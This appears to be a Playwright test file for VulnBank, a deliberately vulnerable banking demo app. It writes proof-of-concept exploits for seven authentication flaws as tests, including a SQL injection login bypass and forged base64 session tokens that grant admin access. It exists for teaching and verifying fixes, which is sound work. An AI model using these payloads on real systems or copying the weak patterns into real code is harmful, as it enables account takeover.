/**
 * Vulnerability tests for VulnBank's "Authentication and sessions" flaws (#1-#7 in
 * VULNERABILITIES.md). Each test proves a specific weakness is exploitable today.
 *
 * These are not unit tests of correct behaviour — they are proof-of-concept exploits
 * written as automated checks, so you can re-run them after a fix and watch them fail
 * (which is how you'd know the fix worked). Read each test's comment before the fix,
 * and its assertion after.
 *
 * Demo users (reset every time the server restarts): admin/admin123, alice/password1.
 */
import { createHash } from 'node:crypto';
import { expect, test } from '@playwright/test';

/** Mirrors VulnBank's (deliberately weak) password hashing, so tests can check it independently. */
const md5 = (text: string) => createHash('md5').update(text).digest('hex');

test.describe('#1 SQL injection in login', () => {
  test('a crafted username bypasses the password check entirely', async ({ request }) => {
    // The login query is built by string concatenation, so a username ending in `'--`
    // comments out the rest of the SQL WHERE clause, including the password check.
    const response = await request.post('/api/login', {
      data: { username: "admin'--", password: 'this value is never checked' },
    });

    expect(response.status()).toBe(200);
    const body = await response.json();
    expect(body.user.username).toBe('admin');
    expect(body.user.role).toBe('admin');
  });
});

test.describe('#2 User enumeration', () => {
  test('login error messages reveal whether a username exists', async ({ request }) => {
    const unknownUser = await request.post('/api/login', {
      data: { username: 'definitely-not-a-real-user', password: 'x' },
    });
    const knownUserWrongPassword = await request.post('/api/login', {
      data: { username: 'alice', password: 'definitely-the-wrong-password' },
    });

    // A secure login endpoint would return the same generic message either way.
    const unknownBody = await unknownUser.json();
    const wrongPasswordBody = await knownUserWrongPassword.json();
    expect(unknownBody.error).not.toBe(wrongPasswordBody.error);
    expect(wrongPasswordBody.error.toLowerCase()).toContain('password');
  });

  test('registration confirms whether a username is already taken', async ({ request }) => {
    const response = await request.post('/api/register', {
      data: { username: 'alice', password: 'whatever123' }, // alice already exists
    });

    expect(response.status()).toBe(409);
    const body = await response.json();
    expect(body.error).toContain('alice'); // confirms the username, not just "that failed"
  });
});

test.describe('#3 No login rate limiting', () => {
  test('many failed attempts in a row are never blocked or slowed down', async ({ request }) => {
    const ATTEMPTS = 15;

    for (let i = 0; i < ATTEMPTS; i++) {
      const guess = await request.post('/api/login', {
        data: { username: 'alice', password: `wrong-guess-${i}` },
      });
      // A protected endpoint would eventually respond 429 (Too Many Requests) or similar.
      // VulnBank just keeps answering 401, attempt after attempt.
      expect(guess.status()).toBe(401);
    }

    // The correct password still works immediately afterwards: no lockout was triggered.
    const correctAttempt = await request.post('/api/login', {
      data: { username: 'alice', password: 'password1' },
    });
    expect(correctAttempt.status()).toBe(200);
  });
});

test.describe('#4 Weak password storage', () => {
  test('passwords are hashed with unsalted MD5, so matching hashes reveal matching passwords', async ({
    request,
  }) => {
    const response = await request.post('/api/login', { data: { username: 'admin', password: 'admin123' } });
    const body = await response.json();

    // No salt: hashing the same password anywhere produces the exact same hash,
    // which is what makes precomputed "rainbow table" cracking possible.
    expect(body.user.password).toBe(md5('admin123'));
  });
});

test.describe('#5 Weak password policy', () => {
  test('a one-character password is accepted on registration', async ({ request }) => {
    const username = `weak_${Date.now()}`;

    const response = await request.post('/api/register', {
      data: { username, password: '1' },
    });
    expect(response.status()).toBe(201);

    // And that single-character password really does work for logging in.
    const login = await request.post('/api/login', { data: { username, password: '1' } });
    expect(login.status()).toBe(200);
  });
});

test.describe('#6 Forgeable session token', () => {
  test('a token can be hand-crafted to impersonate the admin, with no login at all', async ({ request }) => {
    // The real token is just base64 of { id, username, role } — nothing signs or encrypts it.
    // Forging one for the admin account needs no password and no server interaction.
    const forgedClaims = { id: 1, username: 'admin', role: 'admin' };
    const forgedToken = Buffer.from(JSON.stringify(forgedClaims)).toString('base64');

    const response = await request.get('/api/me', {
      headers: { Authorization: `Bearer ${forgedToken}` },
    });

    expect(response.status()).toBe(200);
    const body = await response.json();
    expect(body.username).toBe('admin');
    expect(body.role).toBe('admin');
  });

  test('tampering with a real customer token promotes it to admin', async ({ request }) => {
    const login = await request.post('/api/login', { data: { username: 'alice', password: 'password1' } });
    const { token } = await login.json();

    const claims = JSON.parse(Buffer.from(token, 'base64').toString('utf8'));
    expect(claims.role).toBe('customer'); // alice really is a customer

    claims.role = 'admin'; // tamper with the decoded token
    const tamperedToken = Buffer.from(JSON.stringify(claims)).toString('base64');

    const response = await request.get('/api/admin/users', {
      headers: { Authorization: `Bearer ${tamperedToken}` },
    });
    expect(response.status()).toBe(200); // the admin-only endpoint accepted it
  });
});

test.describe('#7 Insecure session cookie', () => {
  test('the login cookie is missing HttpOnly, Secure and SameSite', async ({ request }) => {
    const response = await request.post('/api/login', { data: { username: 'alice', password: 'password1' } });

    const setCookie = response.headers()['set-cookie'] ?? '';
    expect(setCookie).toContain('session=');

    // Any one of these missing is a real weakness; VulnBank is missing all three:
    // - HttpOnly: without it, JavaScript (e.g. injected via an XSS flaw) can read the cookie.
    // - Secure: without it, the cookie can be sent over plain, unencrypted HTTP.
    // - SameSite: without it, other sites can trigger requests that carry this cookie (CSRF).
    expect(setCookie.toLowerCase()).not.toContain('httponly');
    expect(setCookie.toLowerCase()).not.toContain('secure');
    expect(setCookie.toLowerCase()).not.toContain('samesite');
  });
});
